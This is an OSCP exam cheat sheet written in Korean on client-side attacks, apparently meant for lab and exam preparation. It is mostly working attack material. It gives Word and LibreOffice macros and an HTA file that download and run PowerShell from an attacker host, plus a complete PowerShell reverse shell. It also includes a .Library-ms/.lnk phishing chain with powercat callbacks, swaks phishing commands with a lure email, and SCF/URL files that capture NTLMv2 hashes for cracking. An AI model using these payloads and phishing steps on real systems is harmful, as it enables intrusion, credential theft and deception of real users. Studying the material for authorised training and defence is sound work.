---
title: "클라이언트 사이드 공격 (Client-Side Attacks)"
date: 2026-06-20
weight: 130
draft: false
tags: ["oscp", "cheatsheet"]
summary: "메일, 파일 업로드, 웹 경로로 사용자를 직접 노려 초기 발판을 만드는 공격 모음."
---

메일·파일 업로드·웹 경로로 사용자를 직접 노려 초기 발판을 만드는 공격 모음.

- 출처: https://heretek.dev/oscp-cheatsheet/client-side-attacks/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP

## 공격 선택 의사결정 트리

```text
Can you send email to target?
├── YES → Word Macro (.doc) or Library File (.library-ms) + .lnk
│         └── SMTP server available? → deliver with swaks
└── NO
    ├── Writable SMB share?
    │   └── YES → Drop SCF/URL file → capture NTLMv2 hash → crack
    └── Can victim visit a URL?
        └── YES → HTA file hosted on your server
```

- 시험은 assumed-breach 형식이라 클라이언트 사이드 출현 빈도는 낮다. standalone 박스용으로 알아둔다.

## 상황별 공격 선택표

- SMTP + 이메일 발송 가능 + Windows 박스 보유 → Library-ms + .lnk (작성: 텍스트 에디터 + Windows GUI, 전달: swaks)
- SMTP + 이메일 발송 가능 (Windows 없음) → Word 매크로 .doc (작성: LibreOffice, 전달: swaks)
- 웹 업로드 폼 → ODT 매크로 (작성: LibreOffice GUI, 전달: 업로드 폼)
- 쓰기 가능 SMB 공유 → SCF/URL 파일 (작성: 텍스트 에디터, 전달: 공유에 드롭 + Responder)
- 피해자가 내 URL 방문 → HTA 파일 (작성: 텍스트 에디터, 전달: python3 http.server)

## Word VBA 매크로 공격

### Step 1 — 인코딩된 리버스 셸 생성

```bash
# Encode PowerShell payload (UTF-16LE + Base64 — required for -enc flag)
python3 -c "
import base64,sys
cmd = sys.argv[1]
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
" "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER/powercat.ps1');powercat -c ATTACKER -p 443 -e powershell"
```

### Step 2 — Word에서 매크로 생성

View → Macros → Create:

```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = "powershell.exe -nop -w hidden -enc "
    Str = Str + "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUA..."   ' chunk 1
    Str = Str + "YwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdA..."   ' chunk 2
    CreateObject("Wscript.Shell").Run Str
End Sub
```

- 저장은 반드시 .doc (Word 97-2003)로. .docx는 매크로가 유지되지 않는다.

base64를 VBA에 안전한 50자 청크로 잘라주는 스크립트:

```python
import sys
str = sys.argv[1]  # pass the base64 string as argument
n = 50
for i in range(0, len(str), n):
    print('Str = Str + "' + str[i:i+n] + '"')
```

```bash
# Usage: python3 split.py <BASE64_STRING>
# 출력을 매크로의 Str = "powershell..." 줄과 CreateObject 사이에 붙여넣는다
```

### Step 3 — 전달

```bash
# Host PowerCat
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80

# Listener
nc -nlvp 443
```

## Windows 라이브러리 파일 공격 (.library-ms)

WebDAV 서버를 가리키는 가짜 라이브러리를 만든다. 피해자가 열면 탐색기가 내 WebDAV에 연결하고, 그 안의 악성 .lnk 바로가기가 보인다.

### Step 1 — WebDAV 서버

```bash
pip3 install wsgidav
mkdir ~/webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav
```

### Step 2 — 라이브러리 파일 생성

config.Library-ms로 저장:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <n>@windows.storage.dll,-34582</n>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://ATTACKER_IP</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

### Step 3 — 악성 바로가기 (.lnk) 생성

Windows(RDP)에서 데스크톱 우클릭 > New > Shortcut. 아래는 짧은 powercat 대상 (이유는 뒤의 전체 체인 섹션 참고):

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$KALI:8000/powercat.ps1'); powercat -c $KALI -p 4445 -e powershell"
```

### Step 4 — 이메일로 전달

swaks는 SMTP 만능칼. 명령줄에서 이메일을 보낸다.

```bash
# FIRST — test if email delivers (no attachment, just a test)
sudo swaks -t TARGET@domain.com --from SENDER@domain.com --server MAIL_IP --body "test" --header "Subject: test"

# Reading output:
#   RCPT TO -> 250 OK      = email DELIVERED
#   RCPT TO -> 550 Unknown  = rejected — try adding auth below

# If 550 — add SMTP authentication
sudo swaks -t TARGET@domain.com --from SENDER@domain.com --server MAIL_IP --body "test" --header "Subject: test" -ap -au SMTP_USER -ap SMTP_PASS

# swaks flags:
#   -t            = TO (recipient)
#   --from        = FROM (sender address)
#   --server      = mail server IP
#   -ap           = enable SMTP authentication
#   -au           = auth username (SMTP login — NOT necessarily the sender)
#   -ap           = auth password (found in config files, git repos, databases)
#   --attach @    = attach a file (@ means read from file path)
#   --body @      = email body from file (@ means read from file path)
#   --suppress-data = cleaner output

# REAL phishing email (after test works)
sudo swaks -t TARGET@domain.com --from SENDER@domain.com --attach @config.Library-ms --server MAIL_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap -au SMTP_USER -ap SMTP_PASS
```

SMTP creds를 알아보는 법:

- "email configuration", "smtp", "mail server" 같은 단어가 든 config 파일에서 발견된다.
- "contact" 또는 "responsible"로 표기된 사람은 발송자가 아니라 피싱 대상이다.

## LibreOffice ODT 매크로 공격

Word 매크로와 같은 개념의 ODT 문서 버전. 업로드 폼이 ODT/문서 파일을 받고 서버가 자동으로 "검토"하거나 처리할 때 사용한다.

단계별 진행:

```bash
# 1. Create reverse shell script on Kali
cat > /home/kali/shell.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
EOF

# 2. Open LibreOffice
libreoffice --writer
```

LibreOffice 안에서:

- 가짜 내용 입력 후 File → Save As → resume.odt (반드시 먼저 저장)
- Tools → Macros → Edit Macros
- 왼쪽 패널에서 resume.odt 확장 → Standard → Module1 ("My Macros" 아님)
- 매크로 붙여넣기:

```basic
Sub Main
    Shell("cmd.exe /c powershell IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')")
End Sub
```

- Ctrl+S로 저장
- Tools → Customize → Events 탭
- "Save in:" 드롭다운을 resume.odt로 변경 (LibreOffice 아님)
- Open Document 선택 → Macro... 클릭 → resume.odt → Standard → Module1 → Main
- OK → OK → Ctrl+S 다시

배치(배포):

```bash
# Terminal 1: serve shell.ps1
python3 -m http.server 80

# Terminal 2: listener
rlwrap nc -lvnp 4444

# Upload resume.odt through web form
```

순서가 틀리면 실패한다: 문서 저장 → 문서에 매크로 추가 → 저장 → "Save in: resume.odt"로 이벤트 트리거 설정 → 저장.

## HTA (HTML Application) 공격

```html
<html>
<body>
<script>
var c = "powershell.exe -nop -w hidden -enc <BASE64>";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

```bash
python3 -m http.server 80
# Victim visits: http://ATTACKER/evil.hta → browser prompts to open → shell
```

- msfvenom -f hta-pse는 Metasploit 사용 1회로 counting된다. 수동 HTA를 선호한다.

## 쓰기 가능 공유를 통한 강제 인증 (Forced Authentication)

쓰기 가능 SMB 공유에 아래 파일을 드롭한다. 사용자가 공유를 탐색하면 Windows가 내 서버에서 아이콘을 자동 로드 → NTLMv2 해시가 날아온다.

### SCF 파일 (@inventory.scf로 저장 — @가 목록 맨 위로 정렬)

```ini
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

### URL 파일

```ini
[InternetShortcut]
URL=http://ATTACKER_IP/test
IconIndex=0
IconFile=\\ATTACKER_IP\share\icon.ico
```

### 해시 캡처

```bash
sudo responder -I tun0 -v -A    # ANALYZE mode on exam!
# Or:
impacket-smbserver share . -smb2support
```

### 캡처한 NTLMv2 해시 크랙

Responder가 출력하는 [SMB] NTLMv2-SSP Hash 줄 전체를 파일로 저장해 크랙한다 (NTLMv2는 패스할 수 없고 반드시 크랙해야 한다):

```bash
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
```

- 자세한 모드 번호 → [hash-types.md](hash-types.md), [password-attacks.md](password-attacks.md)

## 페이로드 인코딩 빠른 참조

PowerShell은 Base64 전에 UTF-16LE 인코딩이 필요하다:

```bash
# Python one-liner
python3 -c "
import base64,sys
cmd = sys.argv[1]
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
" "YOUR_POWERSHELL_COMMAND_HERE"

# Use with:
powershell.exe -nop -w hidden -enc <OUTPUT>
```

## Windows 라이브러리 + WebDAV 피싱 (전체 체인)

사용 시점: 유효한 도메인 creds + SMTP 접근은 있지만 셸 접근은 없을 때 (WinRM/RDP/admin 없음). .Library-ms 첨부 피싱 메일을 보내고, 피해자가 열면 탐색기가 내 WebDAV에 연결, 그 안의 악성 .lnk 클릭으로 리버스 셸.

### 체인 흐름

```text
Email with .Library-ms attachment
  -> Victim opens .Library-ms
  -> Windows Explorer connects to YOUR WebDAV share (looks like a local folder)
  -> Victim sees a .lnk shortcut inside the folder
  -> Victim double-clicks .lnk
  -> .lnk runs PowerShell: downloads powercat.ps1 from your HTTP server
  -> powercat creates reverse shell back to your Netcat listener
  -> You have a shell on the victims internal workstation
```

### Step 1: Kali에서 WebDAV 서버 (80 포트)

```bash
pip install wsgidav
mkdir -p ~/webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav/
```

### Step 2: .Library-ms 파일 생성

도구: 아무 텍스트 에디터 (Kali의 nano면 충분). 그냥 XML이다. .Library-ms 확장자로 저장. 파일명 config.Library-ms:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<n>@windows.storage.dll,-34582</n>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://KALI_IP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

- 이 파일은 작업 디렉터리에 저장한다 (webdav 폴더 아님). 이메일 첨부로 발송되는 파일이고 WebDAV가 서빙하지 않는다.

### Step 3: 악성 바로가기 (.lnk) 생성

- 도구: Windows 전용 GUI. Linux에서는 .lnk를 만들 수 없다. RDP로 접속해 데스크톱 우클릭 > New > Shortcut.
- 주의: Windows 바로가기 대상에는 약 260자 제한이 있다. Base64 인코딩 페이로드는 잘려서 조용히 실패한다.
- 필드에 들어가는 "짧은" powercat 버전 사용:

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP:8000/powercat.ps1'); powercat -c KALI_IP -p 4444 -e powershell"
```

- 긴 base64 문자열에 -enc를 쓰지 않는다 — 잘리고 에러 없이 아무 일도 일어나지 않는다.
- 이름은 install로 짓는다. .lnk를 ~/webdav/ (WebDAV 루트)로 옮긴다.

### Step 4: PowerCat 서빙 (8000 포트)

```bash
# Find powercat (path varies by Kali version)
find / -name powercat.ps1 2>/dev/null
# Common locations:
# /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1
# /usr/share/windows-resources/powercat/powercat.ps1
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 8000
```

### Step 5: 리스너 시작 (4444 포트)

```bash
nc -nvlp 4444
```

### Step 6: 피싱 이메일 발송 (Kali에서)

swaks 플래그 전체 참조는 위의 이메일 전달 섹션 참고. 한 줄 버전:

```bash
# Without auth (open relay)
sudo swaks -t TARGET@domain.com --from SENDER@domain.com --attach @config.Library-ms --server MAIL_IP --body @body.txt --header "Subject: Staging Script" --suppress-data

# With auth (if above returns 550)
sudo swaks -t TARGET@domain.com --from SENDER@domain.com --attach @config.Library-ms --server MAIL_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap -au SMTP_USER -ap SMTP_PASS
```

body.txt 예시:

```text
Hey!
Please install the new security features on your workstation.
Download the attached file, double-click on it, and execute
the configuration shortcut within. Thanks!
```

### 동시에 돌아가는 터미널 4개

- 터미널 1: wsgidav (WebDAV), 80 포트 — .lnk 호스팅 (피해자가 여기를 탐색)
- 터미널 2: python3 HTTP, 8000 포트 — powercat.ps1 서빙
- 터미널 3: nc 리스너, 4444 포트 — 리버스 셸 수신
- 터미널 4: swaks — 피싱 이메일 발송

### 파일 배치 (압박 상황에서 헷갈리기 쉬움)

- config.Library-ms — 작성: Kali 텍스트 에디터 (그냥 XML) — 전달: swaks 첨부로 이메일 발송 — 피해자가 탐색기에서 열람
- powercat.ps1 — 작성: Kali에서 /usr/share/powershell-empire/... 에서 복사 — 전달: python3 http.server :8000이 서빙 — .lnk가 자동 다운로드

### 핵심 포인트

- .Library-ms = 이메일 첨부 (webdav 폴더에 넣지 않는다)
- .lnk = webdav 폴더 안 (피해자가 라이브러리 파일을 연 뒤 보게 됨)
- WebDAV는 80 포트여야 한다 (Windows 탐색기가 요구)
- 라이브러리 파일의 URL = Kali IP, 뒤에 경로 없이
- swaks -ap = 메일 서버 패스워드 인증
- 셸 확보 후: winPEAS 업로드, SharpHound 실행, 피벗팅용 Meterpreter+SOCKS 셋업

### 문제 해결 (피싱이 안 될 때)

- swaks가 전달했는가 — 출력에서 "250 OK" 또는 "250 Queued" 확인. 에러가 보이면 메일이 발송되지 않은 것이다.
- 먼저 -ap 없이 시도 — 실습 메일 서버 상당수는 오픈 릴레이. -ap는 불필요한 인증을 강제할 수 있다.
- WebDAV 연결이 없다 — Library-ms의 URL이 틀렸거나 메일이 안 열린 것이다. XML 안의 URL이 Kali IP와 정확히 일치하는지 확인.
- WebDAV는 연결되는데 셸이 없다 — .lnk 페이로드가 깨진 것이다. powercat 명령 확인, 리스너와 포트 일치 확인.
- 이메일 형식 전부 시도 — firstname@domain.com, f.lastname@domain.com, first.last@domain.com
- 모든 직원에게 발송 — 한 명만 찾지 말고 발견한 이름 전부에게.
- 1-2분 기다린다 — 시뮬레이션 유저는 즉시 클릭하지 않는다.
- config.Library-ms는 swaks 첨부로 보내고 webdav 폴더에 넣지 않는다.
- 25 포트(특권 포트)로 보내면 swaks에 sudo 사용.
